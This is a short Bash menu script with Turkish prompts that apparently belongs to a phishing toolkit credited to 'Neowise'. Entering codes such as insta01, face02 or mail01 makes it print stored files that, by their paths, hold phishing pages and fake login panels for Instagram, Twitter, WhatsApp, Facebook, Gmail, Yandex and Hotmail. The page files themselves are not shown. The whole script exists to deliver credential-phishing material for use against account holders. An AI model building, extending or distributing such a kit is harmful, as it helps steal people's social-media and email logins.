#!/bin/bash
clear
echo -e  "


\e[35m     ((( #Code  #Neowise )))


"

echo -e "\e[31m"
read -p "Kod Giriniz: " islem
if [[ $islem == "insta01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-phishing/username-phishing.txt

elif [[ $islem == "insta02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-fakepanel/username-fakepanel.txt

elif [[ $islem == "twitter01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Twitter/Site-phishing/user.txt

elif [[ $islem == "twitter02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Twitter/Site-fakepanel/twitter.txt

elif [[ $islem == "whatsapp01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Whatsapp/Site/code.txt

elif [[ $islem == "face01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Facebook/Site-facebook/facebook.txt

elif [[ $islem == "face02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Facebook/Site-fakepanel/fakepanel.txt
elif [[ $islem == "mail01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-gmail/gmail.txt

elif [[ $islem == "mail02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-yandex/yandex.txt

elif [[ $islem == "mail03" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Hazırlanıyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-hotmail/hotmail.txt
else
	clear
        echo -e "\e[31mHatalı Kod Girdiniz...."
	sleep 3
        bash code.sh
fi
echo -e "\e[31m"
read -p "Ana Menüye Dönmek İçin Enter Bas...." non
cd ..
bash hasaki.sh
